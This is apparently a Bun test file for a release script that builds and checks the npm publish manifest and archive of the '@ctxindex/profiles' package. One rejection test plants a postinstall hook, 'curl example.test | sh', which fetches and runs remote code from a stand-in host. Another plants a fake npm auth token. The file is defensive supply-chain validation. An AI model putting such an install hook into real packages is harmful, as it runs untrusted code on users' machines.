import { expect, test } from 'bun:test'
import {
  assertSafeProfilesPackageFiles,
  createProfilesPublishManifest,
  type ProfilesSourceManifest,
  profilesPackageArchiveName,
} from '../../../scripts/release/profiles-package'

const sourceManifest: ProfilesSourceManifest = {
  name: '@ctxindex/profiles',
  version: '0.1.0',
  description: 'Portable domain Profiles for ctxindex Resources.',
  license: 'MIT',
  private: true,
  type: 'module',
  dependencies: {
    '@ctxindex/extension-sdk': '0.1.0',
    zod: '^4.4.3',
  },
}

const exportNames = [
  '.',
  './calendar-event',
  './chat-message',
  './mail-message',
  './file',
] as const

test('creates the minimal public Profiles manifest with every subpath', () => {
  const manifest = createProfilesPublishManifest(sourceManifest)

  expect(manifest.name).toBe('@ctxindex/profiles')
  expect(manifest.version).toBe('0.1.0')
  expect(manifest.private).toBeUndefined()
  expect(Object.keys(manifest.exports)).toEqual(exportNames)
  expect(manifest.dependencies).toEqual({
    '@ctxindex/extension-sdk': '0.1.0',
    zod: '^4.4.3',
  })
  expect(manifest.files).toEqual(['dist', 'README.md', 'LICENSE'])
  expect(manifest.publishConfig).toEqual({
    access: 'public',
    registry: 'https://registry.npmjs.org/',
  })
})

test('preserves future package and SDK semantic versions', () => {
  const manifest = createProfilesPublishManifest({
    ...sourceManifest,
    version: '2.3.4-beta.5+build.7',
    dependencies: {
      ...sourceManifest.dependencies,
      '@ctxindex/extension-sdk': '1.8.2',
    },
  })

  expect(manifest.version).toBe('2.3.4-beta.5+build.7')
  expect(profilesPackageArchiveName(manifest.version)).toBe(
    'ctxindex-profiles-2.3.4-beta.5+build.7.tgz',
  )
  expect(manifest.dependencies['@ctxindex/extension-sdk']).toBe('1.8.2')
  expect(manifest.private).toBeUndefined()
})

test('requires a private workspace manifest and valid semantic versions', () => {
  expect(() =>
    createProfilesPublishManifest({ ...sourceManifest, private: false }),
  ).toThrow('not publishable')
  expect(() =>
    createProfilesPublishManifest({ ...sourceManifest, version: '02.3.4' }),
  ).toThrow('valid semantic version')
  expect(() =>
    createProfilesPublishManifest({
      ...sourceManifest,
      dependencies: {
        ...sourceManifest.dependencies,
        '@ctxindex/extension-sdk': '^1.8.2',
      },
    }),
  ).toThrow('valid semantic version')
})

test('rejects workspace metadata, lifecycle scripts, secrets, and private imports', () => {
  const manifest = createProfilesPublishManifest(sourceManifest)
  const valid = [
    { path: 'package/LICENSE', content: 'MIT' },
    { path: 'package/README.md', content: '# Profiles' },
    ...[
      'index',
      'calendar-event',
      'chat-message',
      'mail-message',
      'file',
    ].flatMap((name) => [
      {
        path: `package/dist/${name}.d.ts`,
        content: "export { z } from 'zod'",
      },
      {
        path: `package/dist/${name}.js`,
        content:
          "import { defineProfile } from '@ctxindex/extension-sdk'; import { z } from 'zod'",
      },
    ]),
    { path: 'package/package.json', content: JSON.stringify(manifest) },
  ]

  expect(() => assertSafeProfilesPackageFiles(valid)).not.toThrow()
  for (const [label, files] of [
    [
      'workspace dependency',
      valid.map((file) =>
        file.path === 'package/package.json'
          ? { ...file, content: file.content.replace('0.1.0', 'workspace:*') }
          : file,
      ),
    ],
    [
      'lifecycle script',
      valid.map((file) =>
        file.path === 'package/package.json'
          ? {
              ...file,
              content: JSON.stringify({
                ...JSON.parse(file.content),
                scripts: { postinstall: 'curl example.test | sh' },
              }),
            }
          : file,
      ),
    ],
    [
      'secret',
      valid.map((file) =>
        file.path === 'package/README.md'
          ? { ...file, content: '//registry.npmjs.org/:_authToken=npm_secret' }
          : file,
      ),
    ],
    [
      'private import',
      valid.map((file) =>
        file.path === 'package/dist/file.js'
          ? { ...file, content: "import '@ctxindex/core'" }
          : file,
      ),
    ],
  ] as const) {
    expect(() => assertSafeProfilesPackageFiles(files), label).toThrow()
  }
})

test('rejects source, unexpected archive entries, and missing exports', () => {
  const manifest = createProfilesPublishManifest(sourceManifest)
  const files = [
    { path: 'package/LICENSE', content: 'MIT' },
    { path: 'package/README.md', content: '# Profiles' },
    ...[
      'index',
      'calendar-event',
      'chat-message',
      'mail-message',
      'file',
    ].flatMap((name) => [
      { path: `package/dist/${name}.d.ts`, content: 'export {}' },
      { path: `package/dist/${name}.js`, content: 'export {}' },
    ]),
    { path: 'package/package.json', content: JSON.stringify(manifest) },
  ]

  expect(() =>
    assertSafeProfilesPackageFiles([
      ...files,
      { path: 'package/src/index.ts', content: 'source leak' },
    ]),
  ).toThrow('Unexpected Profiles package file')
  expect(() =>
    assertSafeProfilesPackageFiles(
      files.filter(({ path }) => path !== 'package/dist/chat-message.js'),
    ),
  ).toThrow('Missing Profiles package file')
})
